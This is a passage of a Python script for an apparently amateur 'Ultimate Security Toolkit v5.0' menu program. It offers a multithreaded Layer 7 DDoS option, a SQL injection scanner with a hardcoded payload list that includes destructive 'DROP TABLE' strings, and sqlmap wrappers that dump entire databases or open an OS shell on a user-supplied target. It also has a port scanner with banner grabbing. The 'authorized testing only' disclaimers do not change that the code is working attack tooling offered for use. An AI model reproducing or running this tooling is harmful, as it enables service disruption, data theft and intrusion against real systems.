        print(Fore.YELLOW + "    1. Start Burp Suite")
        print(Fore.YELLOW + "    2. Go to Proxy -> Options")
        print(Fore.YELLOW + "    3. Click 'Import / export CA certificate'")
        print(Fore.YELLOW + "    4. Export certificate and import to browser")
    
    elif choice == "5":
        target = input(Fore.YELLOW + "[?] Target URL to spider: " + Fore.WHITE).strip()
        if target:
            print(Fore.CYAN + f"\n[+] Spidering {target}...")
            print(Fore.YELLOW + "[!] Start Burp Suite first and configure proxy")
            print(Fore.CYAN + "[+] Then visit the target URL through Burp Proxy")
    
    elif choice == "6":
        target = input(Fore.YELLOW + "[?] Target URL to scan: " + Fore.WHITE).strip()
        if target:
            print(Fore.CYAN + f"\n[+] Starting active scan on {target}...")
            print(Fore.YELLOW + "[!] Requires Burp Suite Professional")
            print(Fore.CYAN + "[+] Community Edition has limited scanning")
    
    else:
        print(Fore.RED + "[!] Starting Burp Suite GUI...")
        if burp_path.endswith(".jar"):
            os.system(f"java -jar {burp_path} &")
        else:
            os.system(f"{burp_path} &")
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

# =============================================
# MAIN MENU (DIPERBARUI DENGAN FITUR BARU)
# =============================================
def main_menu(username):
    while True:
        clear_screen()
        print(MAIN_ASCII)
        show_user_info(username)
        print(Fore.CYAN + " " * 20 + "ULTIMATE SECURITY TOOLKIT v5.0")
        print(Fore.GREEN + "=" * 70)
        print(Fore.YELLOW + "\n[1]  ULTRA DDoS Attack (Layer 7)")
        print(Fore.YELLOW + "[2]  Advanced SQL Injection Scanner")
        print(Fore.YELLOW + "[3]  SQLMap Auto Exploit (REAL)")
        print(Fore.YELLOW + "[4]  Advanced Port Scanner")
        print(Fore.YELLOW + "[5]  Nmap Scanner (PROFESSIONAL)")
        print(Fore.YELLOW + "[6]  Metasploit Framework (REAL)")
        print(Fore.YELLOW + "[7]  Burp Suite (REAL)")
        print(Fore.YELLOW + "[8]  Exit")
        print(Fore.GREEN + "-" * 70)
        
        choice = input(Fore.CYAN + "\n[?] Select option (1-8): ").strip()
        
        if choice == "1":
            ddos_attack()
        elif choice == "2":
            advanced_sql_injection()
        elif choice == "3":
            target = input(Fore.YELLOW + "[?] Target URL for SQLMap: ").strip()
            if target:
                run_sqlmap(target)
        elif choice == "4":
            port_scanner()
        elif choice == "5":
            nmap_scanner()
        elif choice == "6":
            metasploit_framework()
        elif choice == "7":
            burp_suite()
        elif choice == "8":
            print(Fore.CYAN + "\n[+] Thank you for using Ultimate Security Toolkit v5.0!")
            print(Fore.CYAN + "[+] Creator: mrzxx | Telegram: @Zxxtirwd")
            print(Fore.YELLOW + "[!] Remember: Use only for legal penetration testing!")
            time.sleep(2)
            sys.exit(0)
        else:
            print(Fore.RED + "[!] Invalid choice!")
            time.sleep(1)

# =============================================
# FUNGSI LAIN YANG SUDAH ADA (TIDAK DIUBAH)
# =============================================
def ddos_attack():
    clear_screen()
    print(DDOS_ASCII)
    print(Fore.RED + " " * 20 + "ULTRA DDoS ATTACK SYSTEM")
    print(Fore.RED + "=" * 70)
    
    print(Fore.YELLOW + "\n[!] WARNING: FOR EDUCATIONAL PURPOSES ONLY!")
    print(Fore.YELLOW + "[!] USE ONLY ON SERVERS YOU OWN OR HAVE PERMISSION!\n")
    
    target = input(Fore.YELLOW + "[?] Target URL (http://example.com): " + Fore.WHITE).strip()
    
    if not target.startswith('http'):
        target = 'http://' + target
    
    try:
        print(Fore.CYAN + "\n[+] Testing connection to target...")
        test = requests.get(target, timeout=10)
        print(Fore.GREEN + f"[+] Target reachable (Status: {test.status_code})")
    except Exception as e:
        print(Fore.RED + f"[!] Cannot reach target: {str(e)}")
        choice = input(Fore.YELLOW + "[?] Continue anyway? (y/n): ").lower()
        if choice != 'y':
            return
    
    try:
        threads = int(input(Fore.YELLOW + "\n[?] Attack threads (100-1000, default 500): ") or "500")
        duration = int(input(Fore.YELLOW + "[?] Attack duration seconds (60-600, default 300): ") or "300")
    except:
        threads = 500
        duration = 300
    
    threads = max(100, min(1000, threads))
    duration = max(60, min(600, duration))
    
    print(Fore.RED + "\n" + "="*70)
    print(Fore.RED + "[!] FINAL CONFIRMATION")
    print(Fore.RED + f"[!] Target: {target}")
    print(Fore.RED + f"[!] Threads: {threads}")
    print(Fore.RED + f"[!] Duration: {duration} seconds")
    print(Fore.RED + "="*70)
    
    confirm = input(Fore.RED + "\n[?] START ATTACK? (y/n): ").lower()
    
    if confirm == 'y':
        attack = UltraDDoSAttack()
        attack.start_attack(target, threads, duration)
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

def advanced_sql_injection():
    clear_screen()
    print(SQL_INJECT_ASCII)
    print(Fore.YELLOW + " " * 15 + "ADVANCED SQL INJECTION SCANNER")
    print(Fore.GREEN + "=" * 70)
    
    url = input(Fore.YELLOW + "[?] Target URL with parameter (http://site.com/page?id=1): " + Fore.WHITE).strip()
    
    if not url.startswith('http'):
        url = 'http://' + url
    
    print(Fore.CYAN + "\n[+] Analyzing target...")
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)
    
    if not params:
        print(Fore.RED + "[!] No parameters found in URL")
        print(Fore.YELLOW + "[!] Example: http://site.com/page.php?id=1")
        input("\n[?] Press Enter to continue...")
        return
    
    param_name = list(params.keys())[0]
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    
    print(Fore.GREEN + f"[+] Parameter found: {param_name}")
    print(Fore.GREEN + f"[+] Base URL: {base_url}")
    print(Fore.GREEN + f"[+] Testing {len(params)} parameter(s)")
    
    payloads = [
        "'", "\"", "`", "')", "\")", "`)",
        "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' #",
        "' OR 1=1 --", "' OR 1=1 #", "' OR 1=1 /*",
        "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
        "' UNION SELECT 1--", "' UNION SELECT 1,2--",
        "' UNION SELECT @@version--",
        "' AND SLEEP(5)--", "' OR SLEEP(5)--",
        "'; WAITFOR DELAY '00:00:05'--",
        "' AND 1=1--", "' AND 1=2--",
        "' OR 'a'='a", "' OR 'a'='b",
        "'; DROP TABLE users--", "'; SELECT * FROM users--",
    ]
    
    print(Fore.CYAN + "\n[+] Starting advanced SQLi testing...")
    print(Fore.CYAN + f"[+] Testing {len(payloads)} payloads")
    print(Fore.GREEN + "-"*70)
    
    vulnerabilities = []
    session = requests.Session()
    
    for i, payload in enumerate(payloads):
        print(Fore.YELLOW + f"[{i+1}/{len(payloads)}] Testing: {payload[:30]}...", end='\r')
        
        test_url = f"{base_url}?{param_name}={payload}"
        
        try:
            response = session.get(test_url, timeout=10, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            })
            
            error_patterns = [
                r"SQL.*syntax.*error",
                r"Warning.*mysql",
                r"MySQL.*error",
                r"ORA-[0-9]{5}",
                r"PostgreSQL.*ERROR",
                r"Unclosed.*quotation",
                r"Microsoft.*ODBC",
                r"division.*by.*zero",
                r"unknown.*column",
                r"Table.*doesn't.*exist"
            ]
            
            for pattern in error_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    vulnerabilities.append(payload)
                    print(Fore.GREEN + f"\n[+] VULNERABLE! SQL Error with: {payload}")
                    break
            
            if 'SLEEP' in payload or 'WAITFOR' in payload:
                start = time.time()
                session.get(test_url, timeout=15)
                elapsed = time.time() - start
                if elapsed > 4:
                    vulnerabilities.append(payload)
                    print(Fore.GREEN + f"\n[+] TIME-BASED VULNERABLE! Delay: {elapsed:.1f}s with: {payload}")
            
        except Exception as e:
            pass
    
    print(Fore.GREEN + "\n" + "-"*70)
    
    if vulnerabilities:
        print(Fore.GREEN + f"\n[+] Found {len(vulnerabilities)} vulnerabilities!")
        print(Fore.CYAN + "\n[+] Vulnerable payloads:")
        for i, vuln in enumerate(vulnerabilities[:10], 1):
            print(Fore.YELLOW + f"    {i}. {vuln}")
        
        if len(vulnerabilities) > 10:
            print(Fore.YELLOW + f"    ... and {len(vulnerabilities)-10} more")
        
        print(Fore.CYAN + "\n[+] Recommended: Use SQLMap for full exploitation")
        choice = input(Fore.YELLOW + "\n[?] Run SQLMap now? (y/n): ").lower()
        if choice == 'y':
            run_sqlmap(url)
    else:
        print(Fore.RED + "\n[-] No SQLi vulnerabilities detected")
        print(Fore.YELLOW + "[!] Try SQLMap for deeper testing")
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

def run_sqlmap(target_url):
    clear_screen()
    print(SQLMAP_ASCII)
    print(Fore.GREEN + " " * 15 + "SQLMAP AUTOMATED EXPLOITATION")
    print(Fore.GREEN + "=" * 70)
    
    print(Fore.CYAN + "\n[+] SQLMap Attack Options:")
    print(Fore.YELLOW + "[1] Basic scan (Find injections)")
    print(Fore.YELLOW + "[2] Get databases")
    print(Fore.YELLOW + "[3] Get tables")
    print(Fore.YELLOW + "[4] Dump all data")
    print(Fore.YELLOW + "[5] Get OS shell")
    print(Fore.YELLOW + "[6] Full aggressive scan")
    print(Fore.YELLOW + "[7] Custom command")
    print(Fore.GREEN + "-"*70)
    
    choice = input(Fore.CYAN + "[?] Select option (1-7): ").strip()
    
    commands = {
        '1': f"sqlmap -u \"{target_url}\" --batch --level=3 --risk=2",
        '2': f"sqlmap -u \"{target_url}\" --batch --dbs",
        '3': f"sqlmap -u \"{target_url}\" --batch --tables",
        '4': f"sqlmap -u \"{target_url}\" --batch --dump-all --threads=10",
        '5': f"sqlmap -u \"{target_url}\" --batch --os-shell",
        '6': f"sqlmap -u \"{target_url}\" --batch --level=5 --risk=3 --dbs --tables --dump-all --threads=10 --tamper=space2comment"
    }
    
    if choice == '7':
        custom = input(Fore.YELLOW + "[?] Custom SQLMap command: ").strip()
        command = f"sqlmap {custom}"
    elif choice in commands:
        command = commands[choice]
    else:
        print(Fore.RED + "[!] Invalid choice")
        return
    
    print(Fore.CYAN + f"\n[+] Executing: {command}")
    print(Fore.YELLOW + "[!] This may take several minutes...")
    print(Fore.GREEN + "="*70)
    
    try:
        result = subprocess.run(["sqlmap", "--version"], capture_output=True, text=True)
        
        process = subprocess.Popen(
            command.split(),
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            universal_newlines=True
        )
        
        print(Fore.CYAN + "\n[+] SQLMap Output:\n")
        while True:
            line = process.stdout.readline()
            if not line and process.poll() is not None:
                break
            if line:
                line = line.strip()
                if 'target url' in line.lower():
                    print(Fore.CYAN + line)
                elif 'testing' in line.lower():
                    print(Fore.YELLOW + line)
                elif 'vulnerable' in line.lower() or 'injection' in line.lower():
                    print(Fore.GREEN + line)
                elif 'error' in line.lower() or 'failed' in line.lower():
                    print(Fore.RED + line)
                elif 'database' in line.lower() or 'table' in line.lower():
                    print(Fore.MAGENTA + line)
                else:
                    print(Fore.WHITE + line)
        
        print(Fore.GREEN + "\n" + "="*70)
        print(Fore.GREEN + "[+] SQLMap execution completed")
        
    except FileNotFoundError:
        print(Fore.RED + "\n[!] SQLMap not found!")
        print(Fore.YELLOW + "[!] Install with: pip install sqlmap")
        print(Fore.YELLOW + "[!] Or download from: https://github.com/sqlmapproject/sqlmap")
    
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Interrupted by user")

def port_scanner():
    clear_screen()
    print(PORT_SCAN_ASCII)
    print(Fore.CYAN + " " * 20 + "ADVANCED PORT SCANNER")
    print(Fore.GREEN + "=" * 70)
    
    target = input(Fore.YELLOW + "[?] Target IP/Hostname: ").strip()
    
    try:
        ip = socket.gethostbyname(target)
        print(Fore.GREEN + f"[+] Resolved to IP: {ip}")
    except:
        print(Fore.RED + "[!] Cannot resolve hostname")
        ip = target
    
    common_ports = [
        (21, "FTP"), (22, "SSH"), (23, "Telnet"), (25, "SMTP"), (53, "DNS"),
        (80, "HTTP"), (110, "POP3"), (111, "RPC"), (135, "MSRPC"), (139, "NetBIOS"),
        (143, "IMAP"), (443, "HTTPS"), (445, "SMB"), (993, "IMAPS"), (995, "POP3S"),
        (1433, "MSSQL"), (1521, "Oracle"), (1723, "PPTP"), (3306, "MySQL"),
        (3389, "RDP"), (5432, "PostgreSQL"), (5900, "VNC"), (6379, "Redis"),
        (8080, "HTTP-Proxy"), (8443, "HTTPS-Alt"), (9000, "Jenkins"), (27017, "MongoDB")
    ]
    
    print(Fore.CYAN + f"\n[+] Scanning {len(common_ports)} common ports...")
    print(Fore.GREEN + "-"*70)
    
    open_ports = []
    
    for port, service in common_ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        
        try:
            result = sock.connect_ex((ip, port))
            if result == 0:
                print(Fore.GREEN + f"[+] Port {port}/TCP ({service}): OPEN")
                open_ports.append((port, service))
            else:
                print(Fore.RED + f"[-] Port {port}/TCP ({service}): CLOSED")
        except:
            print(Fore.YELLOW + f"[!] Port {port}/TCP ({service}): ERROR")
        finally:
            sock.close()
    
    print(Fore.GREEN + "-"*70)
    print(Fore.CYAN + f"\n[+] Scan completed!")
    print(Fore.CYAN + f"[+] Found {len(open_ports)} open ports")
    
    if open_ports:
        print(Fore.CYAN + "\n[+] Open ports summary:")
        for port, service in open_ports:
            print(Fore.GREEN + f"    Port {port}: {service}")
    
    if open_ports:
        print(Fore.CYAN + "\n[+] Attempting banner grabbing...")
        for port, service in open_ports[:5]:
            try:
                sock = socket.socket()
                sock.settimeout(3)
                sock.connect((ip, port))
                sock.send(b"HEAD / HTTP/1.0\r\n\r\n" if port in [80, 443, 8080, 8443] else b"\r\n")
                banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                if banner:
                    print(Fore.YELLOW + f"    Port {port} banner: {banner[:50]}...")
                sock.close()
            except:
                pass
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

# =============================================
# INSTALLER DAN MAIN FUNCTION
# =============================================
def check_dependencies():
    """Check and install required dependencies"""
    missing = []
    
    # Check Python modules
    try:
        import colorama
        import requests
    except ImportError:
        missing.append("Python modules")
    
    # Check external tools
    tools = ["nmap", "sqlmap"]
    for tool in tools:
        try:
            subprocess.run([tool, "--version"], capture_output=True, timeout=2)
        except:
            missing.append(tool)
    
    if missing:
        print(Fore.RED + "[!] Missing dependencies: " + ", ".join(missing))
        print(Fore.CYAN + "\n[+] Installation commands:")
        
        if "Python modules" in missing:
            print(Fore.YELLOW + "    pip install colorama requests")
        
        if "nmap" in missing:
            print(Fore.YELLOW + "    Linux: sudo apt install nmap")
            print(Fore.YELLOW + "    Termux: pkg install nmap")
        
        if "sqlmap" in missing:
            print(Fore.YELLOW + "    pip install sqlmap")
            print(Fore.YELLOW + "    Or: git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git")
        
        print(Fore.YELLOW + "\n[!] Install missing tools and restart the program")
        return False
    
    return True

def main():
    try:
        show_welcome()
        
        username = login()
        if not username:
            print(Fore.RED + "\n[!] Access denied!")
            sys.exit(1)
        
        # Check dependencies
        if not check_dependencies():
            print(Fore.YELLOW + "\n[!] Some tools may not work properly")
            time.sleep(2)
        
        main_menu(username)
        
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(Fore.RED + f"\n[!] Error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    print(Fore.CYAN + "[+] Ultimate Security Toolkit v5.0")
    print(Fore.CYAN + "[+] Professional Penetration Testing Suite")
    print(Fore.YELLOW + "[!] WARNING: For authorized security testing only!")
    print(Fore.YELLOW + "[!] Get written permission before scanning any system!")
    print(Fore.GREEN + "=" * 70)
    time.sleep(2)
    
    main()
